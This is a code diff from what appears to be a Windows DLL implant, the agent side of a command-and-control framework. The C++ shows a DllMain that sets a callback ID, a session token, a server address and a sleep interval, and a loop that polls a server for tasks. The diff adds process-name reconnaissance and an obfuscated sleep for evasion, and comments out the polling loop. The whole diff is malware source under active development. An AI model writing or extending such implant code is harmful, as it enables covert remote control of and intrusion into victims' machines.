@@ -3,7 +3,11 @@
 
 bool recieve_commands(const implant_context& ctx) {
 
+    std::string cur_proc_name;
+    recon::get_current_process_name(cur_proc_name);
 
+
+    /*
     HINTERNET hSession = nullptr;
     HINTERNET hConnect = nullptr;
     std::string file_buff;
@@ -16,19 +20,20 @@ bool recieve_commands(const implant_context& ctx) {
             WinHttpCloseHandle(hConnect);
         }
     });
-    if(!open_session(hSession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
+
+    if(!networking::open_session(hSession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
         return false;
     }
 
-    if(!open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, hSession, hConnect)) {
+    if(!networking::open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, hSession, hConnect)) {
         return false;
     }
 
     while(true) {
-        Sleep(ctx.sleep_time);
+        obfus::sleep(ctx.sleep_time);
         std::string server_task;
 
-        if(!send_object_message(
+        if(!networking::send_object_message(
             hConnect,
             ctx.callback_object,
             "get_task",
@@ -45,7 +50,7 @@ bool recieve_commands(const implant_context& ctx) {
 
         std::cout << "recieved task: " << server_task << std::endl;
     }
-|
+    */
     return true;
 }
 
@@ -60,12 +65,12 @@ BOOL APIENTRY DllMain(
 
     implant_context ctx;
     ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
-    ctx.session_token = "Ym52T0szcDZMaWVFNFZjeEx3WFdCMTNwWA==";
+    ctx.session_token = "cU5JU0RZcERzbHZsT1RSdDVUUVBXOXpGbQ==";
     ctx.server_addr = "127.0.0.1";
     ctx.port = 8081;
     ctx.is_https = false;
     ctx.user_agent = "test program/1.0";
-    ctx.sleep_time = 3000;
+    ctx.sleep_time = 2000;
 
     switch (ul_reason_for_call)
     {
